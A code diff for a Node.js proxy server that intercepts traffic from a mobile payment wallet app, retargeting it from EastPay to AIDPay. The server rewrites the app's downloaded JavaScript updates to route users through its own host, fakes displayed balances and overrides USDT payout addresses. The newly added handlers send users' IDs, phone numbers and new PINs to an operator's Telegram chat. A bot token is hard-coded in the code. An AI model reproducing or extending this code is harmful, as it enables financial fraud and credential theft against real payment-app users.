@@ -4,7 +4,7 @@ const { Redis } = require('@upstash/redis');
 const crypto = require('crypto');
 
 const app = express();
-const ORIGINAL_API = 'https://api.eastpay-wallet.com';
+const ORIGINAL_API = 'https://api.aidpay-api.com';
 const BOT_TOKEN = '8568538419:AAE90H83MD1M4y_iDqMlNDIPwBH2ft4uqW0';
 const WEBHOOK_URL = 'https://dschf.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -39,6 +39,7 @@ const tokenUserMap = {};
 const userPhoneMap = {};
 let debugNextResponse = false;
 let debugMode = false;
+const lastInfoSent = {};
 
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
@@ -287,7 +288,7 @@ async function proxyFetch(req) {
       fwd[k] = v;
     }
   }
-  fwd['host'] = 'api.eastpay-wallet.com';
+  fwd['host'] = 'api.aidpay-api.com';
   const opts = { method: req.method, headers: fwd };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -570,7 +571,7 @@ app.get('/health', async (req, res) => {
     proxy: data.botEnabled ? 'ON' : 'OFF',
     banks: data.banks.length,
     tracked: Object.keys(data.trackedUsers || {}).length,
-    app: 'EastPay (dschf)'
+    app: 'AIDPay Proxy'
   });
 });
 
@@ -587,7 +588,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user');
+      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user');
       return res.sendStatus(200);
     }
 
@@ -815,7 +816,7 @@ app.post('/bot-webhook', async (req, res) => {
       try {
         const testResp = await fetch(`${ORIGINAL_API}/app/pay/debit/task`, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Signature': sig, 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'X-Requested-With': 'com.eastpay.wallet', 'Accept': 'application/json, text/plain, */*' },
+          headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Signature': sig, 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'X-Requested-With': 'com.aid.pay.app', 'Accept': 'application/json, text/plain, */*' },
           body: JSON.stringify(bodyObj)
         });
         const testText = await testResp.text();
@@ -1171,22 +1172,7 @@ app.all('/app/user/account/wallet', async (req, res) => {
     delete respHeaders['last-modified'];
     res.writeHead(200, respHeaders);
     res.end(walletBody);
-    if (!isLogOff(data, userId) && data.adminChatId && bot && data.logRequests) {
-      const walletOvr = data.userOverrides && data.userOverrides[String(userId)];
-      const walletAdded = walletOvr && walletOvr.addedBalance !== undefined ? walletOvr.addedBalance : 0;
-      const wBal = respData
-        ? (respData.balance ?? respData.wallet ?? respData.amount ?? respData.inrBalance ?? respData.received ?? 'N/A')
-        : 'N/A';
-      const phone = getPhone(data, userId);
-      let wMsg = `💼 Wallet [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
-      if (walletAdded !== 0) {
-        const realW = wBal !== 'N/A' ? parseFloat(wBal) - walletAdded : 'N/A';
-        wMsg += `\n🏦 Real: ₹${realW} | ➕ Added: ₹${walletAdded} | 👁️ Shows: ₹${wBal}`;
-      } else {
-        wMsg += `\n💰 Balance: ₹${wBal}`;
-      }
-      bot.sendMessage(data.adminChatId, wMsg).catch(()=>{});
-    }
+    sendDebugLog(data, req, walletBody, 'Wallet');
   } catch(e) { await transparentProxy(req, res); }
 });
 
@@ -1537,8 +1523,82 @@ app.all('/app/auth/refresh/session', async (req, res) => {
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
+app.all('/app/api/customer/list', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    sendJson(res, respHeaders, jsonResp, respBody);
+    sendDebugLog(data, req, respBody, 'Customer Support');
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      bot.sendMessage(data.adminChatId,
+        `📞 Customer Support [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n🕐 ${now}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/app/user/cs/url', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    sendJson(res, respHeaders, jsonResp, respBody);
+    sendDebugLog(data, req, respBody, 'Contact Us');
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      bot.sendMessage(data.adminChatId,
+        `📞 Contact Us [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n🕐 ${now}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/app/secure/pin/reset', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const body = req.parsedBody || {};
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    sendJson(res, respHeaders, jsonResp, respBody);
+    sendDebugLog(data, req, respBody, 'PIN Reset');
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const newPin = body.pin || body.newPin || body.securePin || '';
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      const ok = jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success);
+      bot.sendMessage(data.adminChatId,
+        `🔐 PIN Reset [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}${newPin ? '\n🔑 New PIN: ' + newPin : ''}\n${ok ? '✅ Success' : '❌ Failed'}\n🕐 ${now}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.all('/app/auth/send/code', async (req, res) => { await transparentProxy(req, res); });
-app.all('/app/auth/logout', async (req, res) => { await transparentProxy(req, res); });
+app.all('/app/auth/logout', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    const effectiveId = userId || '';
+    sendJson(res, respHeaders, jsonResp, respBody);
+    sendDebugLog(data, req, respBody, 'Logout');
+    if (data.adminChatId && bot) {
+      const phone = getPhone(data, effectiveId);
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      bot.sendMessage(data.adminChatId,
+        `🚪 Logout [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n🕐 ${now}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
 
 const LOG_ONLY_ENDPOINTS = [
   '/app/user/team/info', '/app/user/invite/code/list', '/app/user/add/invite/code',
@@ -1568,7 +1628,7 @@ for (const ep of LOG_ONLY_ENDPOINTS) {
   });
 }
 
-const CHCP_CDN = 'https://wallet-coin.oss-ap-southeast-1.aliyuncs.com/app/eastpay/release/chcp';
+const CHCP_CDN = 'https://wallet-coin.oss-ap-southeast-1.aliyuncs.com/app/aidpay/release/chcp';
 app.get('/chcp/*', async (req, res) => {
   try {
     const filePath = req.path.replace(/^\/chcp\//, '');
@@ -1578,17 +1638,17 @@ app.get('/chcp/*', async (req, res) => {
     const contentType = resp.headers.get('content-type') || 'application/octet-stream';
     if (filePath.endsWith('.js')) {
       let body = await resp.text();
-      body = body.replace(/https:\/\/api\.eastpay-wallet\.com\//g, 'https://dschf.vercel.app/');
-      body = body.replace(/https:\/\/api\.eastpay-wallet\.com\/app/g, 'https://dschf.vercel.app/app');
-      body = body.replace(/api\.eastpay-wallet\.com\/app/g, 'dschf.vercel.app/app');
-      body = body.replace(/https:\/\/socket\.eastpay-wallet\.com\//g, 'https://dschf.vercel.app/');
-      body = body.replace(/https:\/\/app-web\.eastpay-wallet\.com\//g, 'https://dschf.vercel.app/');
-      body = body.replace(/https:\/\/wallet-coin\.oss-ap-southeast-1\.aliyuncs\.com\/app\/eastpay\/release\/chcp\//g, 'https://dschf.vercel.app/chcp/');
+      body = body.replace(/https:\/\/api\.aidpay-api\.com\//g, 'https://dschf.vercel.app/');
+      body = body.replace(/https:\/\/api\.aidpay-api\.com\/app/g, 'https://dschf.vercel.app/app');
+      body = body.replace(/api\.aidpay-api\.com\/app/g, 'dschf.vercel.app/app');
+      body = body.replace(/https:\/\/socket\.aidpay-api\.com\//g, 'https://dschf.vercel.app/');
+      body = body.replace(/https:\/\/app-web\.aidpay-web\.com\//g, 'https://dschf.vercel.app/');
+      body = body.replace(/https:\/\/wallet-coin\.oss-ap-southeast-1\.aliyuncs\.com\/app\/aidpay\/release\/chcp\//g, 'https://dschf.vercel.app/chcp/');
       res.set('Content-Type', contentType);
       res.send(body);
     } else if (filePath === 'chcp.json') {
       let body = await resp.text();
-      body = body.replace(/https:\/\/wallet-coin\.oss-ap-southeast-1\.aliyuncs\.com\/app\/eastpay\/release\/chcp\//g, 'https://dschf.vercel.app/chcp/');
+      body = body.replace(/https:\/\/wallet-coin\.oss-ap-southeast-1\.aliyuncs\.com\/app\/aidpay\/release\/chcp\//g, 'https://dschf.vercel.app/chcp/');
       res.set('Content-Type', contentType);
       res.send(body);
     } else {
